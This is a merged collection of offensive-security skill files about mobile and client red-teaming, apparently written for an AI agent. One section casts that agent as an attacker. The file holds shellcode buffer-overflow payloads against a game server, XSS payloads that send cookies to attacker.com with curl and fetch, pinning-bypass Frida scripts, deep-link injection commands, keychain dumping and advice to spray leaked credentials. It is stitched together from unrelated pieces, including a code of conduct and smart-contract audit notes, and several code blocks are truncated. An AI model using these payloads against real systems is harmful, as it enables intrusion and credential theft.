# MERGED SOURCE KNOWLEDGE: mobile

146 unique sections from 9 source files. Each section appears in exactly one target.


## SOURCE: hunt-skills/apk-redteam-pipeline/SKILL.md

## When to use this skill

Trigger when:
- Recon surfaces 1+ mobile apps under the target's developer name (Play Store dev page)
- A web app hosts `*.apk` files directly (e.g. `Recruitz.apk` found on a subdomain during one engagement)
- APK package IDs leaked via stealer logs (e.g. `com.<brand>.app`, `com.<brand>.<sub-brand>` patterns in stealer dump format)
- Customer-facing app, dealer/partner portal, or employee mobile companion app is in scope
- Bug bounty program lists Android in scope

DO NOT use for:
- iOS-only targets (different pipeline — IPA reverse, MobSF, frida-ios-dump)
- React Native / Flutter web apps already covered by JS bundle analysis
- Server-side only assessments

---

# Find developer page from the target's brand name
curl -sk -A "Mozilla/5.0" "https://play.google.com/store/apps/developer?id=<Brand+Name>" -o /tmp/dev.html

# Extract package IDs
grep -oE 'id=[a-zA-Z0-9._]+' /tmp/dev.html | sort -u
```

Example output (anonymized — 7 packages typical for a multi-brand conglomerate):
```
com.events.<brand>build
com.<corp>.<sub-brand-1>
com.<corp>.<sub-brand-2>
com.<corp>.<flagship>
com.<corp>.<product-line-1>
com.<corp>.<product-line-2>
com.<corp>.<sub-brand-3>
```

### Cross-reference with stealer logs
Stealer-log format includes package names like `*@com.<corp>.<app>` — extract these from `creds_userpass.txt` if you have a leaked dump.

### Brand permutation guesses (multi-brand conglomerate patterns)
```
com.<brand>.app
com.<brand>.mobile  
com.<brand>.android
com.<brand>connect.app
in.<brand>.dealer
in.co.<brand>.app
```

---

# Follow 302 redirects to actual download
curl -sk -L --max-time 60 \
  "https://d.apkpure.net/b/APK/<package_id>?version=latest" \
  -o "<package_id>.apk"

### Secondary: APKMirror search
```bash
curl -sk -A "Mozilla/5.0" "https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=<brand>" \
  | grep -oE 'href="[^"]+\.apk[^"]*"' | sort -u
```

### Tertiary: APKPure web search
```bash
curl -sk "https://apkpure.com/search?q=<brand>" | grep -oE 'data-dt-app="[^"]+"'
```

### XAPK vs APK
- `.xapk` = a zip containing multiple split APKs (base + config.armeabi-v7a + config.en + etc.)
- Unzip outer first, then unzip the inner `base.apk` or `<package>.apk`
- Some apkpure downloads return truncated XAPK with missing EOCD signature — symptom of CDN rate-limiting; rotate IP and retry, OR use `7z x` which is more lenient than `unzip`

```bash

# Standard unzip (works for clean APK)
unzip -o <package>.apk -d extracted_<package>/

# For nested XAPK
for inner in extracted_<package>/*.apk; do
  mkdir -p "extracted_<package>/$(basename "$inner" .apk)"
  unzip -o "$inner" -d "extracted_<package>/$(basename "$inner" .apk)"
done
```

---

# or
wget https://github.com/skylot/jadx/releases/latest/download/jadx-1.5.x.zip

# For XAPK that contains multiple APKs
for inner in extracted_<package>/*.apk; do
  jadx -d decompiled_<package>_$(basename "$inner" .apk)/ "$inner"
done
```

For a fast "strings only" pass without full decompilation:
```bash
find extracted_<package> -name "classes*.dex" -exec strings -8 {} \; > strings_<package>.txt
```

---

# URL grep — owned-domain references
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net|in)[a-zA-Z0-9./_?=&%-]*' strings_<package>.txt | sort -u

# Internal IP / port URLs
grep -oE 'https?://(10\.|172\.(1[6-9]|2[0-9]|3[01])\.|192\.168\.|127\.)[0-9.]+(:[0-9]+)?[a-zA-Z0-9./_?=&-]*' strings_<package>.txt

# Cloud credentials
grep -oE 'AKIA[A-Z0-9]{16}'                            # AWS Access Key
grep -oE 'aws_secret_access_key[\s:=]+[A-Za-z0-9/+=]{40}' # AWS Secret
grep -oE 'AIza[A-Za-z0-9_-]{35}'                       # Google API key
grep -oE 'ya29\.[A-Za-z0-9_-]+'                        # Google OAuth refresh token
grep -oE 'gh[ps]_[A-Za-z0-9]{36}'                      # GitHub PAT
grep -oE 'glpat-[A-Za-z0-9_-]{20}'                     # GitLab PAT
grep -oE 'xox[pbar]-[A-Za-z0-9-]+'                     # Slack token
grep -oE 'sk-[A-Za-z0-9]{48}'                          # OpenAI API key
grep -oE 'sk-ant-[A-Za-z0-9_-]{90,}'                   # Anthropic API key
grep -oE 'AC[a-f0-9]{32}'                              # Twilio Account SID
grep -oE 'sk_live_[A-Za-z0-9]{24}'                     # Stripe live key
grep -oE 'pk_live_[A-Za-z0-9]{24}'                     # Stripe publishable
grep -oE 'mailgun-[A-Za-z0-9-]{40}'                    # Mailgun
grep -oE 'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}'    # SendGrid

# JWT (any algorithm)
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_<package>.txt

# Firebase
grep -oE '"(api_key|project_id|database_url|storage_bucket|client_id|mobilesdk_app_id|google_app_id|gcm_defaultSenderId)"\s*:\s*"[^"]+"' \
  extracted_<package>/res/values/strings.xml \
  extracted_<package>/google-services.json \
  decompiled_<package>/resources/AndroidManifest.xml 2>/dev/null

# OAuth client secrets
grep -oE 'client_secret["\s:=]+[A-Za-z0-9_-]{24,}' strings_<package>.txt

# Hardcoded passwords (heuristic — many false positives, manual review)
grep -oE '"password"\s*:\s*"[^"]+"|password\s*=\s*"[^"]+"' decompiled_<package>/sources/**/*.java 2>/dev/null
```

# Customer-facing APK shipped a hardcoded URL of this shape:
https://api.<client>.example/<path-token>/<resource-token>?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.<payload>.<sig>

# Expired ~8 years earlier — but path tokens + 30 /v1/* endpoints still useful intel
```

---

# Find .cer / .der / .pem files in assets/
find extracted_<package>/assets -iname "*.cer" -o -iname "*.der" -o -iname "*.pem" -o -iname "*.crt" 2>/dev/null

# Or in network_security_config.xml
find extracted_<package> -name "network_security_config.xml" -exec cat {} \;

# For each cert, extract subject + SAN (might reveal new internal API hosts)
for cert in $(find extracted_<package>/assets -iname "*.cer"); do
  echo "=== $cert ==="
  openssl x509 -in "$cert" -noout -subject -issuer -dates 2>/dev/null
  openssl x509 -in "$cert" -noout -text 2>/dev/null | grep -E 'Subject:|DNS:|Issuer:|Validity'
done
```

### Real-world example
A customer-facing APK from an authorized engagement contained `assets/api_<service>_<domain>_com.cer` — revealed the existence of an `api.<service>.<domain>.example` asset that had NOT surfaced in passive recon.

---

## Stage 5 — Exported component enumeration

AndroidManifest.xml lists components. Exported ones (especially with `android:exported="true"` or implicit-export via intent-filter) can be triggered by other apps — potential intent-injection attack surface.

```bash

# Decode binary AndroidManifest if needed
apktool d <package>.apk -o decoded_<package>/    # apktool decodes binary manifest

# Or read directly from jadx output
cat decompiled_<package>/resources/AndroidManifest.xml | grep -E '<(activity|service|receiver|provider)' | head -50

# Filter exported
grep -E 'android:exported="true"' decompiled_<package>/resources/AndroidManifest.xml
```

For each exported component, check:
- Does it accept extras that flow into a WebView (intent → WebView → XSS / file://)
- Does it accept URI extras (potential SSRF via deep link)
- Does it pass extras to other Activities (intent redirection)

---

# google-services.json — full Firebase config
find extracted_<package> -name "google-services.json" -exec cat {} \; | python3 -m json.tool

#   project_id   → can guess Firestore / RTDB URL: https://<project_id>.firebaseio.com/.json

# Test if Firestore is publicly readable
curl -s "https://firestore.googleapis.com/v1/projects/<project_id>/databases/(default)/documents/users"

# Test if Realtime DB is publicly readable
curl -s "https://<project_id>.firebaseio.com/.json"

# Test if Storage Bucket is publicly listable
curl -s "https://firebasestorage.googleapis.com/v0/b/<bucket>/o"
```

---

## Stage 7 — Runtime instrumentation (Frida)

For when static analysis isn't enough — you want to dump tokens at runtime, bypass cert pinning, or trace API calls.

### Setup
```bash
pip install --break-system-packages frida-tools objection
adb devices  # ensure device/emulator connected

# Push frida-server to device (root required, or use rooted emulator like Genymotion / x86_64 AVD)
```

### Cert-pinning bypass (universal)
```javascript
// frida-script-pinning-bypass.js
Java.perform(function() {
    // OkHttp
    try {
        var CertificatePinner = Java.use('okhttp3.CertificatePinner');
        CertificatePinner.check.overload('java.lang.String', 'java.util.List').implementation = function() {
            console.log('[+] OkHttp pinning bypassed for: ' + arguments[0]);
            return;
        };
    } catch (e) {}
    // HttpsURLConnection
    try {
        var TrustManagerImpl = Java.use('com.android.org.conscrypt.TrustManagerImpl');
        TrustManagerImpl.verifyChain.implementation = function(chain) {
            console.log('[+] TrustManagerImpl verifyChain bypassed');
            return chain;
        };
    } catch (e) {}
});
```
```bash
frida -U -l frida-script-pinning-bypass.js -f <package_id> --no-pause
```

### Hook HTTP requests
```javascript
Java.perform(function() {
    var OkHttpClient = Java.use('okhttp3.OkHttpClient');
    var Request = Java.use('okhttp3.Request');
    var Call = Java.use('okhttp3.Call');
    
    OkHttpClient.newCall.implementation = function(req) {
        var url = req.url().toString();
        var headers = req.headers().toString();
        console.log('[REQ] ' + url);
        console.log('[HDRS] ' + headers);
        return this.newCall(req);
    };
});
```

### Quick token extraction via objection
```bash
objection --gadget com.target.app explore

# Inside:
android hooking watch class_method <class>.<method> --dump-args --dump-return
```

---

## Stage 8 — Network traffic capture (via mitmproxy)

For deeper API discovery once pinning is bypassed.

```bash

## Decision tree — what to do with what you find

| Finding | Next move |
|---|---|
| Active JWT (not expired) | Test against the API host — does it grant access? Try sid manipulation |
| Expired JWT | Inspect path tokens / API endpoint structure — useful intel for post-VPN |
| AWS access key | Use `awscli` to test: `aws sts get-caller-identity` — many leaked keys still have permissions |
| Firebase project_id + web_api_key | Test public Firestore/RTDB/Storage read |
| Google API key (AIza*) | Test against `https://www.googleapis.com/customsearch/v1` etc. — see what API the key activates |
| Hardcoded HTTP URLs (http://) | Possible MITM via downgrade if cert pinning is missing |
| Pinned cert for internal host | New asset discovery — that host is real |
| Exported Activity with WebView | Test intent-injection → URL-loading abuse |
| Stack-trace artifacts (Stack Overflow URLs) | Identify the developer's questions → infer architecture |
| Hardcoded credentials | Spray immediately (respect any caps from related skills) |

---

## Anti-patterns

- **Don't grep only for "password"** — most secrets have specific high-signal patterns (AKIA, AIza, eyJ, etc.). Generic word grep produces too much noise.
- **Don't skip XAPK split APKs** — config.armeabi splits and config.<lang> splits sometimes contain different code paths.
- **Don't trust expired JWTs as "dead intel"** — the path structure, endpoint list, and signing algorithm are still useful. The 8-year-expired-JWT example above shows this.
- **Don't reverse only the latest version** — older APK versions (via APKMirror version history) sometimes have secrets removed in newer versions but still active server-side.
- **Don't ignore Firebase even if app looks "simple"** — Firebase rules misconfigurations (public read on Firestore) are extremely common.
- **Don't run Frida on a production device** — use rooted emulator or test device only.

---

## Tooling install (one-time)

```bash
brew install jadx p7zip
pip install --break-system-packages frida-tools objection

# Genymotion or AVD for rooted Android emulator
```

For APK download convenience, can add a `download-apk` shell function:
```bash
download-apk() {
  local pkg="$1"
  curl -sk -L --max-time 60 "https://d.apkpure.net/b/APK/$pkg?version=latest" -o "$pkg.apk"
  echo "Downloaded $(wc -c < "$pkg.apk") bytes"
  file "$pkg.apk"
}
```

---

## Bridge to neighboring skills

- `offensive-osint` — Play Store / APKMirror enum is part of broader OSINT
- `hunt-cloud-misconfig` — Firebase public-read is exactly this skill's specialty post-discovery
- `hunt-api-misconfig` — JWT manipulation once you have the algorithm + sample token
- `evidence-hygiene` — extracted secrets need redaction before report inclusion
- `redteam-mindset` — APK reverse on day-1 of an engagement, not as an afterthought

---

## Real-world finding template (anonymized — authorized engagement)

**Finding: Hardcoded JWT + 30+ Internal API Endpoints in a customer-facing APK**

- Subject: Hardcoded artifacts in legacy mobile build reveal internal API surface
- Observations: Decompilation of `com.<client>.<app>` revealed embedded JWT (expired ~8 years earlier) and 30+ `/v1/*` endpoint paths against `api2.<client>.example` (internal-only externally)
- Description: APK ships with developer build artifacts. Path tokens are security-by-obscurity; API endpoint inventory is reconnaissance-grade.
- Impact: Post-VPN-foothold (via cred compromise), attacker has full API surface map without binary reverse. HS256 secret recovery (via SSRF/LFI) would yield arbitrary token forging.
- Recommendation: rotate HS256 secret, migrate to RS256, remove hardcoded URLs from builds, audit all org APKs.
- Evidence: extracted strings, decoded JWT, endpoint inventory

---

## Related Skills & Chains

- **`cloud-iam-deep`** — APK secret extraction frequently yields live AWS/GCP/Azure credentials. Chain primitive: jadx string-grep produces AWS Access Key ID + Secret → `cloud-iam-deep` `aws sts get-caller-identity` → role/policy enumeration → IAM privilege-escalation path (one of 24 documented AWS escalation patterns) → cloud-plane takeover. Same flow applies to GCP service-account JSON and Azure shared-access-signature tokens extracted from APK resources.
- **`hunt-api-misconfig`** — APK endpoint inventory hands you the API surface for free; mass-assignment, JWT, and CORS bugs are typical. Chain primitive: APK reveals `/v1/users/me` and `/v1/admin/users` → `hunt-api-misconfig` mass-assignment probes (`{is_admin:true}`) against `/v1/users/me` → admin role escalation → access to `/v1/admin/users`.
- **`hunt-rce`** — Hardcoded JWT signing secrets (HS256) extracted from APK enable arbitrary token forging. Chain primitive: APK strings yield HS256 secret → forge admin token → access admin API → if API has eval/template/sink → `hunt-rce` to server. Also: exported components with intent-injection sinks can reach `Runtime.exec` if app is local-installed.
- **`offensive-osint`** — APK is one node in the broader org recon graph; pair with breach corpora and cert transparency. Chain primitive: APK reveals internal API hostname `api2.example.com` → `offensive-osint` certificate-transparency lookup → discover sibling subdomains → expanded attack surface.
- **`redteam-report-template`** — APK findings need clear "what the binary leaks" framing because client engineers often dismiss mobile-static findings as "obfuscation problem." Chain primitive: validated finding (token/URL/secret extracted) → `triage-validation` 7-Question Gate (specifically: "does this credential still authenticate today?") → `redteam-report-template` packaging with explicit binary version + extraction reproduction steps.


## SOURCE: hunt-skills/bountyforge/references/hacking-agents/mobile-client-agent.md

# Mobile & Client-Side Agent

You are an attacker that exploits mobile apps, desktop clients, game engines, and browser-based applications. You find RCE via buffer overflows, deep link injection, exported components, and client-side parsing vulnerabilities.

Other agents cover web, infrastructure, and credentials. You own: APK/IPA analysis, Electron app extraction, game client fuzzing, deep link abuse, and WebView exploitation.

# Check AndroidManifest.xml for exported components
cat /tmp/apk/AndroidManifest.xml | grep -A2 "exported=\"true\""

# Find activities, receivers, services
grep -r "activity\|receiver\|service" /tmp/apk/AndroidManifest.xml

# Search for hardcoded secrets
grep -r "api_key\|secret\|token\|password" /tmp/apk/ --include="*.xml" --include="*.smali"

# Find deeplinks
grep -r "android:scheme\|android:host\|android:pathPrefix" /tmp/apk/AndroidManifest.xml

# Check for insecure connections
grep -r "usesCleartextTraffic\|networkSecurityConfig" /tmp/apk/AndroidManifest.xml

# Find WebView JavaScript bridges
grep -r "addJavascriptInterface\|@JavascriptInterface" /tmp/apk/ --include="*.smali"
```

**Deep link injection testing:**
```bash

# Test exported activities
adb shell am start -a android.intent.action.VIEW -d "myapp://evil.com/path" com.target.app

# Test with malicious parameters
adb shell am start -a android.intent.action.VIEW -d "myapp://callback?token=evil" com.target.app

# Test intent:// scheme
adb shell am start -a android.intent.action.VIEW -d "intent://evil.com#Intent;scheme=myapp;end"
```

# Check Info.plist for URL schemes
plutil -p /tmp/ipa/Payload/*.app/Info.plist | grep -A2 "CFBundleURLSchemes"

# Check for exported entitlements
security cms -D -i /tmp/ipa/Payload/*.app/embedded.mobileprovision | plutil - -

# Search for hardcoded secrets
strings /tmp/ipa/Payload/*.app/* | grep -i "key\|token\|secret\|password"

# Check for insecure transport
grep -r "NSAppTransportSecurity" /tmp/ipa/Payload/*.app/Info.plist
```

### Electron App Extraction (H100 Proven — $50K)

A leaked GitHub token in a compiled Electron app gave full repository access.

```bash

# Find hardcoded URLs
grep -r "https://api\.\|https://internal\.\|https://admin\." /tmp/app/ --include="*.js"

# Check for insecure deserialization
grep -r "eval(\|Function(\|child_process\|require(" /tmp/app/ --include="*.js" | grep -v node_modules
```

### Game Client Exploitation (H100 Proven — Valve, PlayStation)

4 reports in the top 100 targeted game/desktop clients for RCE.

**Buffer overflow in server info parsing:**
```python

# Craft oversized server info response
payload = b"A" * 1024 + b"\x90" * 100  # NOP sled
payload += b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"  # shellcode

# Send to game server
import socket
s = socket.socket()
s.connect(("target-game-server.com", 27015))
s.send(payload)
```

**XSS in game chat (proven pattern):**
```javascript
// Steam chat client renders HTML
// Inject via chat message
<img src=x onerror="require('child_process').exec('curl https://attacker.com/steal?data='+document.cookie)">

// Or via server name
<svg/onload="fetch('https://attacker.com/steal?data='+btoa(document.cookie))">
```

**Malformed data file parsing:**
```python

# Overflow in file parser → code execution
import struct

payload = b"\x41" * 256  # padding
payload += struct.pack("<Q", 0x4141414141414141)  # overwritten return address
payload += b"\x90" * 100  # NOP sled
payload += shellcode

with open("malicious.nav", "wb") as f:
    f.write(payload)
```

### WebView JavaScript Bridge (Android)

```javascript
// If app uses addJavascriptInterface
// Access Java methods from JavaScript

// enumerate exposed methods
for (var key in window) {
    if (typeof window[key] === 'object' && window[key] !== null) {
        console.log(key + ': ' + Object.keys(window[key]).join(', '));
    }
}

// Common dangerous patterns:
// WebView.loadUrl("javascript:" + userInput)
// WebView.evaluateJavascript(userInput, callback)
```

# bypass.js
Java.perform(function() {
    var TrustManager = Java.registerClass({
        name: 'com.bypass.TrustManager',
        implements: [Java.use('javax.net.ssl.X509TrustManager')],
        methods: {
            checkClientTrusted: function(chain, authType) {},
            checkServerTrusted: function(chain, authType) {},
            getAcceptedIssuers: function() { return []; }
        }
    });
    
    var SSLContext = Java.use('javax.net.ssl.SSLContext');
    var ctx = SSLContext.getInstance('TLS');
    ctx.init(null, [TrustManager.$new()], null);
});
```

# Check common ports
for port in 8080 8443 3000 5000 9090 27015 27016 27017; do
  curl -s -o /dev/null -w "port $port: %{http_code}\n" "http://127.0.0.1:$port/"
done

# Check for debug/development endpoints
curl -s "http://127.0.0.1:8080/debug"
curl -s "http://127.0.0.1:8080/admin"
curl -s "http://127.0.0.1:8080/actuator"
```

# Find installed apps
ls /Applications/  # macOS
ls /usr/share/applications/  # Linux

# Check for hardcoded endpoints
strings /Applications/Target.app/Contents/MacOS/* | grep -i "https://\|http://"

# Check for debug flags
strings /Applications/Target.app/Contents/MacOS/* | grep -i "debug\|verbose\|test\|staging"

# Check for insecure deserialization
strings /Applications/Target.app/Contents/MacOS/* | grep -i "pickle\|marshal\|yaml.load\|eval("
```

## Output Fields

Add to FINDINGs:

```
platform: android | ios | electron | game-client | desktop
app_version: <version if determinable>
decompile_method: apktool | jadx | jeb | strings
exported_components: <list of exported activities/receivers>
deep_links: <list of URI schemes>
secrets_found: <list of leaked credentials>
bridge_exposed: true | false
local_server_port: <port if running locally>
rce_potential: true | false
```

## Rules
- Always extract and decompile apps before testing — don't guess
- Check both current code AND git history for secrets in compiled apps
- Deep links are injection vectors — test with malicious parameters
- Game clients parse untrusted data (server info, chat) — fuzz these parsers
- Certificate pinning bypass is needed for API testing — use Frida/objection
- Local servers often lack auth — test all endpoints
- Exported Android components can be triggered by any app
- WebView bridges can leak sensitive data — enumerate all exposed methods


## SOURCE: hunt-skills/bountyforge/skills/pashov/CODE_OF_CONDUCT.md

## Our Pledge

We are committed to making participation in this project a welcoming, respectful experience for everyone, regardless of age, background, experience level, nationality, or identity.

## Expected Behavior

- Be kind and constructive in all communications.
- Give and receive feedback graciously.
- Focus on what is best for the community.
- Show empathy toward other contributors.
- Respect differing viewpoints and experiences.

## Unacceptable Behavior

- Personal attacks, insults, or derogatory comments.
- Intimidation or threatening behavior, public or private.
- Sharing others' private information without consent.
- Any conduct that would be considered inappropriate in a professional setting.

## Enforcement

Report violations to the maintainers via the contact on the [GitHub profile](https://github.com/pashov). All reports are reviewed and investigated confidentially. Maintainers may remove contributions or restrict access for violations of this code.

## Scope

This Code of Conduct applies within all project spaces — issues, pull requests, discussions, and code — and in public spaces when representing the project.

## Attribution

Adapted from the [Contributor Covenant](https://www.contributor-covenant.org), version 2.1.


## SOURCE: hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-7-token-operations/fv-anc-7-cl2-using-init-with-an-ata.md

## TLDR

Using `#[account(init, associated_token::...)]` on a token account fails if the ATA already exists, because `init` requires the account to be uninitialized. Any user who pre-creates the ATA before the instruction runs triggers a transaction failure, producing a denial-of-service vector.

## Detection Heuristics

**init Constraint on Associated Token Account**
- `#[account(init, payer = ..., associated_token::mint = ..., associated_token::authority = ...)]` applied to an ATA that may have been created externally before the instruction is called
- Instruction documented as idempotent but uses `init` which is not idempotent for pre-existing accounts

**ATA Creation in Permissionless or User-Facing Instructions**
- `init` on an ATA in a public instruction callable by any user, where any participant can pre-create the ATA to block others
- Protocol initialization flow that creates ATAs for all participants using `init` without considering pre-existing accounts

**Error Handling Does Not Account for AlreadyInUse**
- No fallback logic for `ErrorCode::AccountAlreadyInUse` in the client or program, causing silent failures when ATA exists

## False Positives

- ATA creation is in a one-time admin initialization instruction where the admin controls the timing and pre-creation is not possible by unprivileged users
- Program explicitly checks for and handles the pre-existing ATA case before the `init` instruction is reached


## SOURCE: hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-7-token-operations/fv-anc-7-cl5-interest-bearing-mint-principal-vs-balance-confusion.md

## TLDR

Token-2022 interest-bearing mints compound an on-chain rate that increases the displayed token balance over time. Programs that read the raw `TokenAccount.amount` without calling the extension's `amount_to_ui_amount` conversion will undercount the actual accrued value, leading to mispriced collateral, incorrect liquidation thresholds, or silent yield extraction by users who understand the accounting gap.

## Detection Heuristics

**Raw Amount Read Without Interest Normalization**
- Protocol reads `token_account.amount` on a Token-2022 interest-bearing mint and uses it directly in a collateral value or share price calculation
- No call to `spl_token_2022::extension::interest_bearing_mint::amount_to_ui_amount` or equivalent before arithmetic on the token amount
- Comparison of token amounts across different timestamps without normalizing both values to the same accrued-interest basis

**Mint Extension Not Checked at Initialization**
- Vault or pool initialization does not inspect the mint account for the `InterestBearingConfig` extension before accepting the mint
- Protocol documentation claims to handle interest-bearing tokens but accounting code uses raw `amount` without adjusting for the configured rate and elapsed time

**Reward or Collateral Valuation Bypass**
- Attacker deposits tokens, waits for interest to accrue, then withdraws at the original amount rather than the inflated displayed amount, pocketing the difference
- Protocol applies interest only at the contract level but ignores Token-2022 on-chain interest extension, double-counting or missing yield

## False Positives

- Protocol explicitly rejects interest-bearing mints at initialization by checking for the absence of `InterestBearingConfig` extension and reverting if found
- Interest-bearing rate on the mint extension is set to 0, making accrued interest zero across all time


## SOURCE: hunt-skills/bountyforge/skills/smart-contract-audit/reference/anchor/fv-anc-7-token-operations/readme.md

## Classifications

Run `cat $SKILL_DIR/reference/anchor/fv-anc-7-token-operations/<filename>` to read any case file listed below.


## SOURCE: hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-4-shared-objects-concurrency/fv-mov-4-cl4-clock-and-time.md

## TLDR

Sui provides reliable on-chain time via `clock::timestamp_ms(&clock)`, which returns time in milliseconds. Common failures: (1) `Clock` not used at all; (2) time constants mixed between milliseconds and seconds; (3) no deadline parameter on time-sensitive operations. These result in locks that are instantly expired or last years, and operations that execute at stale conditions.

## Detection Heuristics

- Search for hardcoded time comparisons not using `clock::timestamp_ms` - these use no reliable on-chain time source
- Find all time constants (lock durations, staleness thresholds, vesting periods) and verify they end with `_MS` and represent milliseconds
- A constant like `one_day = 86400` (without `_MS`) compared against `clock::timestamp_ms` makes the lock 86 seconds; `one_day = 0` (SuiPad finding) makes it instant
- Check every swap, deposit, and withdrawal function for a `deadline_ms: u64` parameter and `assert!(clock::timestamp_ms(&clock) <= deadline_ms)`
- Verify `Clock` is passed as `&Clock` (shared object at address `0x6`) - not created locally

## False Positives

- Constants documented as milliseconds with explicit `_MS` suffix and correct values
- Deadline parameter present and enforced on all time-sensitive functions
- No time-dependent logic in the contract


## SOURCE: hunt-skills/bountyforge/skills/smart-contract-audit/reference/move/fv-mov-6-token-accounting/fv-mov-6-cl3-fee-accounting.md

## TLDR

Fee bypass occurs when an alternate code path (emergency withdraw, admin withdraw, batch operation) skips the fee calculation. Non-atomic fee deduction allows a PTB to skip the fee step. Missing fee withdrawal function locks protocol revenue permanently.

## Detection Heuristics

- Map all exit paths from a vault or pool: normal withdrawal, emergency withdrawal, admin withdrawal, batch withdrawal - verify every path calls the same fee calculation function
- Check whether fee deduction is in a separate function from the main operation; in a PTB, the caller controls execution order and could omit the fee step
- Search for fee collection logic that increments a `fee_balance` or `accumulated_fees` counter - verify a corresponding `withdraw_fees` or `claim_fees` function exists and is accessible to the admin
- Verify fee amount calculation uses consistent pre-fee vs post-fee amounts throughout - mixing gross and net amounts creates discrepancies
- `fee_balance == 0` with no withdrawal function in a protocol that claims to collect fees is a strong signal of a missing function

## False Positives

- Single fee calculation helper called from every exit path
- Fee and principal deducted atomically within the same function with no separable steps
- Fee withdrawal function exists and is admin-gated


## SOURCE: hunt-skills/ios-redteam-pipeline/SKILL.md

## When to use this skill

Trigger when:
- Recon surfaces 1+ apps under the target's Apple Developer / App Store publisher page
- A TestFlight public link or enterprise/ad-hoc `.ipa`/`manifest.plist` (OTA install) is found
- Customer-facing app, dealer/partner portal, or employee mobile companion app ships on iOS
- Bug bounty program lists iOS in scope
- `apk-redteam-pipeline` already found Android endpoints/secrets — the iOS build often ships a *different* backend version worth diffing (see `hunt-shadow-api`)

DO NOT use for:
- Android-only targets — that's `apk-redteam-pipeline`
- React Native / Flutter apps already fully covered by JS-bundle analysis on the web side
- Server-side only assessments with no mobile client in scope

---

# App Store search API (no auth, no scraping needed)
curl -s "https://itunes.apple.com/search?term=<brand>&country=us&entity=software&limit=50" | python3 -m json.tool

# Pull the full metadata for a known bundle ID (once you have one)
curl -s "https://itunes.apple.com/lookup?bundleId=com.<brand>.app&country=us"
```

Extract: `trackId`, `bundleId`, `sellerName` (developer account — pivot to find sibling apps), `version`,
`releaseNotes` (changelogs often reference deprecated/removed API behavior — feeds `hunt-shadow-api`).

Cross-reference sibling-app bundle IDs surfaced from Android APK inventories (same
multi-brand conglomerate usually reuses `com.<corp>.<sub-brand>` naming on both platforms).

---

### Primary: from a real device you control (no jailbreak needed for a purchased/free app)
```bash

# Install the app on a real device via Apple Configurator 2 or Xcode, then pull the .ipa

# Apple Configurator 2 (macOS): Devices > select device > right-click installed app > "Save to..."

# Or via libimobiledevice:
brew install libimobiledevice ideviceinstaller
ideviceinstaller -l              # list installed apps + bundle IDs
```

### Secondary: TestFlight (if the program distributes betas publicly)
Open the public TestFlight link, install via the TestFlight app, then extract as above.
TestFlight builds are frequently LESS hardened than App Store releases (debug logging left on,
staging API hosts hardcoded) — always prefer a TestFlight build over the Store build if both exist.

# itms-services:// links embed a manifest.plist with a direct .ipa URL
curl -s "https://<target>/manifest.plist" | plutil -convert xml1 -o - -

# Look for <key>software-package</key> — that URL is a directly downloadable, unencrypted IPA
curl -sk -L "<software-package-url>" -o target.ipa
```
Enterprise/ad-hoc IPAs are **not FairPlay-encrypted** — no jailbreak or decryption tooling needed,
unlike an App Store binary pulled from a device.

### Decrypting an App-Store-sourced binary (only if extracted from a jailbroken device)
App Store binaries are FairPlay-encrypted at rest; a binary copied off a jailbroken device
needs runtime decryption (`frida-ios-dump`, `bagbak`, or `flexdecrypt`) before static tools can
read it meaningfully:
```bash
pip install --break-system-packages frida-tools

# with frida-server running on the jailbroken device and the app in foreground:
python3 dump.py <bundle_id>          # frida-ios-dump — outputs a decrypted .ipa
```

---

# An IPA is just a zip
unzip -o target.ipa -d extracted_target/
cd extracted_target/Payload/*.app

# Info.plist — bundle ID, URL schemes, ATS config, entitlements hint
plutil -convert xml1 -o - Info.plist

# Entitlements — codesign reads the .app bundle (or the Mach-O binary), NOT Info.plist
codesign -d --entitlements :- Payload/<AppName>.app 2>/dev/null || \
  security cms -D -i embedded.mobileprovision | plutil -convert xml1 -o - -

# class-dump for Objective-C symbol/class recovery (compiled binary, not the .app bundle)
brew install class-dump
class-dump -H <AppBinaryName> -o headers/

# Swift binaries: class-dump won't show much — use Hopper, Ghidra, or `nm`/`strings` instead
nm -a <AppBinaryName> | grep -i swift | head -50
strings -a <AppBinaryName> > strings_target.txt
```

For a fast triage pass without a disassembler, the strings dump alone usually surfaces most of
what Stage 3 is looking for.

---

## Stage 3 — Secret grep (same catalog as apk-redteam-pipeline, iOS-specific sources added)

```bash

# URL grep — owned-domain references
grep -oE 'https?://[a-zA-Z0-9.-]+\.(target1|target2|target3)\.(com|io|net)[a-zA-Z0-9./_?=&%-]*' strings_target.txt | sort -u

# Cloud credentials (same 60-pattern catalog as Android — reuse verbatim)
grep -oE 'AKIA[A-Z0-9]{16}'                             # AWS Access Key
grep -oE 'AIza[A-Za-z0-9_-]{35}'                        # Google API key
grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_target.txt   # JWT

# iOS-specific: GoogleService-Info.plist (Firebase config bundled per-platform)
find extracted_target -iname "GoogleService-Info.plist" -exec plutil -convert xml1 -o - {} \;

# Look for API_KEY, PROJECT_ID, STORAGE_BUCKET, GCM_SENDER_ID, GOOGLE_APP_ID — same Firebase

# iOS-specific: hardcoded config plists shipped in the bundle
find extracted_target -iname "*.plist" ! -iname "Info.plist" -exec sh -c 'echo "=== {} ==="; plutil -convert xml1 -o - "{}"' \;

# App Transport Security exceptions (Info.plist) — tells you if arbitrary/insecure loads are allowed
plutil -extract NSAppTransportSecurity xml1 -o - Info.plist 2>/dev/null
```

### Keychain items left in a backup (if you have a device backup, encrypted or not)
```bash
pip install --break-system-packages iphone_backup_decrypt   # for encrypted local backups

# keychain-dumper (run ON a jailbroken device) for live keychain contents:
./keychain-dumper -e   # -e also decodes entitlements per item, showing which app owns which secret
```

---

## Stage 4 — App Transport Security (ATS) misconfig + certificate-pinning bypass

